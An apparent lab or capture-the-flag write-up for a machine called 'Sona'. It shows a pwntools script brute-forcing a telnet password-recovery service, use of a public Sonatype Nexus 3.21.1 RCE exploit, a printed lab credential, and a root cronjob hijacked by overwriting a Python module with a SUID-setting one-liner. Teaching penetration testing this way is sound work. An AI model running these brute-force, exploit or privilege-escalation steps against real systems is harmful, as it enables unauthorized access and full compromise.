---
icon: ubuntu
---

# Sona - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.137.159 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 20:50 EDT
Nmap scan report for 192.168.137.159
Host is up (0.034s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
23/tcp   open  telnet?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     ====================
|     NEXUS BACKUP MANAGER
|     ====================
|     ANSONE Answer question one
|     ANSTWO Answer question two
|     BACKUP Perform backup
|     EXIT Exit
|     HELP Show help
|     HINT Show hints
|     RECOVER Recover admin password
|     RESTORE Restore backup
|     Incorrect
|   NULL, tn3270: 
|     ====================
|     NEXUS BACKUP MANAGER
|     ====================
|     ANSONE Answer question one
|     ANSTWO Answer question two
|     BACKUP Perform backup
|     EXIT Exit
|     HELP Show help
|     HINT Show hints
|     RECOVER Recover admin password
|_    RESTORE Restore backup
8081/tcp open  http    Jetty 9.4.18.v20190429
|_http-server-header: Nexus/3.21.1-01 (OSS)                                                                                                         
|_http-title: Nexus Repository Manager                                                                                                              
| http-robots.txt: 2 disallowed entries                                                                                                             
|_/repository/ /service/ 
```

### <mark style="color:$primary;">HTTP Port 8081 TCP</mark>

<figure><img src="../../.gitbook/assets/image (385).png" alt=""><figcaption></figcaption></figure>

Default credentials admin:admin, nexus:nexus did not work here

Searchsploit reveals an RCE, but we need to find some credentials

<figure><img src="../../.gitbook/assets/image (386).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Telnet Port 23 TCP</mark>

```
nc -vv 192.168.137.159 23
```

<figure><img src="../../.gitbook/assets/image (387).png" alt=""><figcaption></figcaption></figure>

It looks like we can recover the admin password from here. it looks like we need to get the answer to those 2 questions. [**Seclists**](https://github.com/danielmiessler/SecLists) has a wordlist for colors as for zodiac signs I can just make one.

### <mark style="color:$primary;">Brute Force Telnet Password</mark>

<figure><img src="../../.gitbook/assets/image (388).png" alt=""><figcaption></figcaption></figure>

Below is a wordlist of all zodiac signs

```
capricorn
aquarius
aries
libra
scorpio
virgo
taurus
pisces
gemini
leo
cancer
sagittarius
```

Now we can use a python script to brute force the answer

```
from pwn import *

def interact(word):
	r = remote('192.168.137.159', 23)
	for i in range(11):
		r.recvline()
	r.sendline(b'ANSTWO')
	r.recvline()
	r.recvline()
	r.sendline(word.encode())
	response = r.recvline()
	if b'Incorrect' in response:
		r.close()
	else:
		log.info("Correct!")
		log.info(f"Password is {word}")
		r.close()
		
def main():
	with open ('html-colors.txt', 'r') as file:
		for line in file:
			interact(line)

main()
```

```
python3 brute.py
```

<figure><img src="../../.gitbook/assets/image (389).png" alt=""><figcaption></figcaption></figure>

Than we can do the same for the zodiac signs, just change the code&#x20;

```
from pwn import *

def interact(word):
	r = remote('192.168.137.159', 23)
	for i in range(11):
		r.recvline()
	r.sendline(b'ANSONE')
	r.recvline()
	r.recvline()
	r.sendline(word.encode())
	response = r.recvline()
	if b'Incorrect' in response:
		r.close()
	else:
		log.info("Correct!")
		log.info(f"Password is {word}")
		r.close()
		
def main():
	with open ('zodiacs.txt', 'r') as file:
		for line in file:
			interact(line)

main()
```

<figure><img src="../../.gitbook/assets/image (390).png" alt=""><figcaption></figcaption></figure>

The correct answer includes the words `black` and `leo`I'll make a wordlist and try them

```
blackleo
leoblack
leo
black
```

<figure><img src="../../.gitbook/assets/image (391).png" alt=""><figcaption></figcaption></figure>

it worked we got the admin user's password! Now to make user of the exploit we discovered earlier

### <mark style="color:$primary;">Sonatype Nexus 3.21.1 - RCE \[Authenticated]</mark>

```
searchsploit -m 49385.py
```

<figure><img src="../../.gitbook/assets/image (392).png" alt=""><figcaption></figcaption></figure>

These are the changes I made to the exploit, now to setup a listener and run it

<figure><img src="../../.gitbook/assets/image (393).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (395).png" alt=""><figcaption></figcaption></figure>

There is another user on this box besides nexus and sona. Going to look for some credentials

<figure><img src="../../.gitbook/assets/image (397).png" alt=""><figcaption></figcaption></figure>

`KuramaThe9`

<figure><img src="../../.gitbook/assets/image (398).png" alt=""><figcaption></figcaption></figure>

I managed to find credentials for sona!

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (399).png" alt=""><figcaption></figcaption></figure>

That is an interesting writable file!

### <mark style="color:$primary;">PSPY</mark>

<figure><img src="../../.gitbook/assets/image (396).png" alt=""><figcaption></figcaption></figure>

I found a script that is being run by root every minute located in sona's home directory. I also found a log file in /tmp that seems to be the result of the cronjob this means the cronjob is using the `/usr/lib/python3.8/base64.py module`!

<figure><img src="../../.gitbook/assets/image (400).png" alt=""><figcaption></figcaption></figure>

I'll replace the module with a malicious script that sets the SUID bit on /bin/bash

```
echo 'import os;os.system("chmod u+s /bin/bash")' > /usr/lib/python3.8/base64.py
```

Now wait for root to execute it

<figure><img src="../../.gitbook/assets/image (401).png" alt=""><figcaption></figcaption></figure>

And we are root now!
